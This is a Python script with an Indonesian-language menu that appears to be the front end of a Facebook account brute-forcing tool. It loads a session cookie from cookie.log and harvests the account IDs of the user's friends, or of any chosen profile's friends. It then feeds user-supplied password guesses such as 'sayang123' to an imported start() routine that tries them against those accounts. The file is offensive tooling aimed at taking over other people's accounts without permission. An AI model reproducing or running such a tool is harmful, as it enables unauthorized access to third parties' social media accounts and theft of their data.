'''
Name: Brute Force
Date: 27-07-2020
Author: Pandas ID
'''

class Main:

    def __init__(self):
        os.system('clear')
        try:
            files = open('cookie.log', 'r').read()
            data = parserData(files)
            if data == 'IC':
                print('    -! Invalid Cookie')
                os.system('rm cookie.log');exit()
            elif data == 'CP':
                print('    -! Akun Checkpoint')
                os.system('rm cookie.log');exit()
            else:
                pass
        except FileNotFoundError:
            print('    -! Simpan cookie di file dengan nama: cookie.log')
            exit()

        self.head = 'https://free.facebook.com'
        self.data = data

    def menu(self):
        os.system('clear')
        print('    [ BRUTE FORCE FB ]')
        print('    ------------------')
        print('    User : '+self.data[1])
        print('    1. Brute Force Dari Teman')
        print('    2. Brute Force Dari Temannya Teman')
        print('    0. Keluar')
        pil = input('\n    -> ')
        if pil == '1':
            print('\n    -> Mendapatkan ID Dari Teman')
            id = Dump(self.data[0]).user('/me')
            print('\n    -> Contoh: sayang,doraemon,sayang123')
            pasw = input('    -> Masukan Tebakan Password: ').split(',')
            print('\n    -> Memulai Proses Brute Force')
            start(id, pasw)

        elif pil == '2':
            inpid = input('    -> ID: ')
            profil = req.get(self.head+'/'+inpid, cookies=self.data[0])
            username = re.search(r'\<title\>(.*?)\<\/title\>', profil.text).group(1)
            if username == 'Halaman Tidak Ditemukan':
                print('    -! Invalid ID')
                exit()
            else:
                print('\n    -> Mendapatkan ID Dari: '+username)
                id = Dump(self.data[0]).user('/'+inpid)
                print('\n    -> Contoh: sayang,doraemon,sayang123')
                pasw = input('    -> Masukan Tebakan Password: ').split(',')
                print('\n    -> Memulai Proses Brute Force')
                start(id, pasw)
        elif pil == '0':
            exit()
        else:
            self.menu()

if __name__ == '__main__':
    from core.login import parserData
    from core.dump import Dump
    from core.brute import start
    import requests as req
    import os,re
    Main().menu()
